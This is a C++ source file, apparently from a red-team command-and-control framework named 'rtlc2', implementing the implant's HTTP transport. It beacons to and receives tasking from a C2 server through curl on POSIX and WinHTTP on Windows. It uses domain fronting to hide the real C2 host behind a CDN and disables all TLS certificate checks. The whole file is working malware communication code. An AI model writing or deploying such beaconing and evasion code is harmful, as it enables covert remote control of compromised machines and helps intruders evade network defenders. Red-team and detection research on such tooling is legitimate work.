#include "transport.h"
#include "config.h"
#include <cstring>

namespace rtlc2 {
namespace transport {

HTTPTransport::HTTPTransport(const std::string& host, int port, bool use_tls, const std::string& user_agent)
    : host_(host), port_(port), use_tls_(use_tls), user_agent_(user_agent) {

    std::string scheme = use_tls ? "https" : "http";
    base_url_ = scheme + "://" + host + ":" + std::to_string(port);

#ifdef RTLC2_WINDOWS
    session_ = nullptr;
    InitWinHTTP();
#endif
}

HTTPTransport::~HTTPTransport() {
#ifdef RTLC2_WINDOWS
    CleanupWinHTTP();
#endif
}

void HTTPTransport::SetHeader(const std::string& key, const std::string& value) {
    headers_[key] = value;
}

// Transport interface implementations
Response HTTPTransport::Send(const std::vector<uint8_t>& data) {
    return Post(RTLC2_CHECKIN_URI, data);
}

Response HTTPTransport::Receive() {
    return Get(RTLC2_CHECKIN_URI);
}

bool HTTPTransport::Connect() {
    connected_ = true;
    return true;
}

void HTTPTransport::Disconnect() {
    connected_ = false;
#ifdef RTLC2_WINDOWS
    CleanupWinHTTP();
#endif
}

bool HTTPTransport::IsConnected() const {
    return connected_;
}

// ======================== POSIX (curl) Implementation ========================
#ifndef RTLC2_WINDOWS

#include <curl/curl.h>

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    auto* buf = static_cast<std::vector<uint8_t>*>(userp);
    size_t total = size * nmemb;
    auto* bytes = static_cast<uint8_t*>(contents);
    buf->insert(buf->end(), bytes, bytes + total);
    return total;
}

Response HTTPTransport::Post(const std::string& path, const std::vector<uint8_t>& data) {
    return CurlRequest("POST", path, data);
}

Response HTTPTransport::Get(const std::string& path) {
    return CurlRequest("GET", path, {});
}

Response HTTPTransport::CurlRequest(const std::string& method, const std::string& path,
                                     const std::vector<uint8_t>& data) {
    Response resp;
    resp.success = false;

    CURL* curl = curl_easy_init();
    if (!curl) {
        resp.error = "Failed to init curl";
        return resp;
    }

    // Domain fronting: if front_domain_ is set, connect to it instead
    // but send the real Host header so the CDN routes to the actual C2
    std::string url;
    if (!front_domain_.empty()) {
        std::string scheme = use_tls_ ? "https" : "http";
        url = scheme + "://" + front_domain_ + ":" + std::to_string(port_) + path;
    } else {
        url = base_url_ + path;
    }
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_USERAGENT, user_agent_.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp.body);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);

    // Disable SSL verification (for self-signed certs in lab environments)
    if (use_tls_) {
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    }

    // Custom headers
    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");

    // Domain fronting: add Host header pointing to the real C2
    if (!front_domain_.empty()) {
        std::string hostHeader = "Host: " + host_;
        headers = curl_slist_append(headers, hostHeader.c_str());
    }

    for (const auto& h : headers_) {
        std::string header = h.first + ": " + h.second;
        headers = curl_slist_append(headers, header.c_str());
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    if (method == "POST") {
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data.data());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, static_cast<long>(data.size()));
    }

    CURLcode res = curl_easy_perform(curl);
    if (res == CURLE_OK) {
        long http_code = 0;
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
        resp.status_code = static_cast<int>(http_code);
        resp.success = true;
    } else {
        resp.error = curl_easy_strerror(res);
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return resp;
}

#endif // !RTLC2_WINDOWS

// ======================== Windows (WinHTTP) Implementation ========================
#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <winhttp.h>
#pragma comment(lib, "winhttp.lib")

bool HTTPTransport::InitWinHTTP() {
    std::wstring agent(user_agent_.begin(), user_agent_.end());
    session_ = WinHttpOpen(agent.c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    return session_ != nullptr;
}

void HTTPTransport::CleanupWinHTTP() {
    if (session_) {
        WinHttpCloseHandle(session_);
        session_ = nullptr;
    }
}

Response HTTPTransport::Post(const std::string& path, const std::vector<uint8_t>& data) {
    return WinHTTPRequest("POST", path, data);
}

Response HTTPTransport::Get(const std::string& path) {
    return WinHTTPRequest("GET", path, {});
}

Response HTTPTransport::WinHTTPRequest(const std::string& method, const std::string& path,
                                        const std::vector<uint8_t>& data) {
    Response resp;
    resp.success = false;

    if (!session_) {
        resp.error = "WinHTTP not initialized";
        return resp;
    }

    // Domain fronting: connect to front_domain_ instead of real host_
    std::string connectHost = (!front_domain_.empty()) ? front_domain_ : host_;
    std::wstring whost(connectHost.begin(), connectHost.end());
    std::wstring wpath(path.begin(), path.end());
    std::wstring wmethod(method.begin(), method.end());

    HINTERNET connect = WinHttpConnect(static_cast<HINTERNET>(session_),
                                        whost.c_str(), port_, 0);
    if (!connect) {
        resp.error = "WinHttpConnect failed";
        return resp;
    }

    DWORD flags = use_tls_ ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET request = WinHttpOpenRequest(connect, wmethod.c_str(), wpath.c_str(),
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!request) {
        WinHttpCloseHandle(connect);
        resp.error = "WinHttpOpenRequest failed";
        return resp;
    }

    // Disable cert validation for self-signed certs
    if (use_tls_) {
        DWORD sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
    }

    // Add custom headers
    for (const auto& h : headers_) {
        std::string header = h.first + ": " + h.second;
        std::wstring wheader(header.begin(), header.end());
        WinHttpAddRequestHeaders(request, wheader.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);
    }

    // Domain fronting: override Host header with real C2 host
    if (!front_domain_.empty()) {
        std::string hostHdr = "Host: " + host_;
        std::wstring wHostHdr(hostHdr.begin(), hostHdr.end());
        WinHttpAddRequestHeaders(request, wHostHdr.c_str(), -1L,
                                  WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);
    }

    // Send request
    BOOL result;
    if (method == "POST" && !data.empty()) {
        std::wstring content_type = L"Content-Type: application/octet-stream";
        WinHttpAddRequestHeaders(request, content_type.c_str(), -1L, WINHTTP_ADDREQ_FLAG_ADD);
        result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                     (LPVOID)data.data(), (DWORD)data.size(),
                                     (DWORD)data.size(), 0);
    } else {
        result = WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                     WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    }

    if (!result) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        resp.error = "WinHttpSendRequest failed";
        return resp;
    }

    result = WinHttpReceiveResponse(request, NULL);
    if (!result) {
        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        resp.error = "WinHttpReceiveResponse failed";
        return resp;
    }

    // Get status code
    DWORD status_code = 0;
    DWORD size = sizeof(DWORD);
    WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status_code, &size,
                        WINHTTP_NO_HEADER_INDEX);
    resp.status_code = static_cast<int>(status_code);

    // Read response body
    DWORD bytes_available = 0;
    do {
        WinHttpQueryDataAvailable(request, &bytes_available);
        if (bytes_available > 0) {
            std::vector<uint8_t> buffer(bytes_available);
            DWORD bytes_read = 0;
            WinHttpReadData(request, buffer.data(), bytes_available, &bytes_read);
            resp.body.insert(resp.body.end(), buffer.begin(), buffer.begin() + bytes_read);
        }
    } while (bytes_available > 0);

    resp.success = true;

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    return resp;
}

#endif // RTLC2_WINDOWS

} // namespace transport
} // namespace rtlc2
